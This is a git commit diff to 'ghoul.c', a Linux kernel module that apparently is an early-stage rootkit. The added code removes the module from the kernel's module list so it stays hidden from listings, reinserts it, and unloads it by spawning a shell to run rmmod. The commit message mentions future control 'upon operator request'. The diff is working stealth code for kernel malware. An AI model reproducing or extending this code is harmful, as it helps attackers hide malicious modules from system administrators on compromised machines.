bb2b346b7504af080fed74c83e033cf2e36c26f3
Ofek Shaked <oshaked1@gmail.com>
2022-07-19 18:54:21 +0000

    Added self hiding and unloading The module hides itself from the module list upon entry. After done, the module reinserts itself to the list and removes itself with a usermode helper. This is currently done immediately after initialization, but later will be performed upon operator request.

--- ghoul.c
+++ ghoul.c
@@ -1,13 +1,41 @@
 #include <linux/module.h>
 
+static struct list_head *prev_module;
+
+void hide_self(void)
+{
+    pr_info("Ghoul: hiding Self\n");
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+void show_self(void)
+{
+    pr_info("Ghoul: showing self\n");
+    list_add(&THIS_MODULE->list, prev_module);
+}
+
+void unload_self(void)
+{
+    // as kernel modules cannot unload themselves directly, a usermode helper is used
+    char *argv[] = { "/bin/sh", "-c", "/sbin/rmmod ghoul", NULL };
+    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
+}
+
 static int __init ghoul_init(void)
 {
-    pr_info("Ghoul Inserted\n");
+    pr_info("Ghoul: inserted\n");
+    hide_self();
+
+    // show self and unload (this is temporary as later this will be done upon operator request)
+    show_self();
+    unload_self();
     return 0;
 }
 
 static void __exit ghoul_exit(void)
 {
+    pr_info("Ghoul: removed\n");
     return;
 }
 
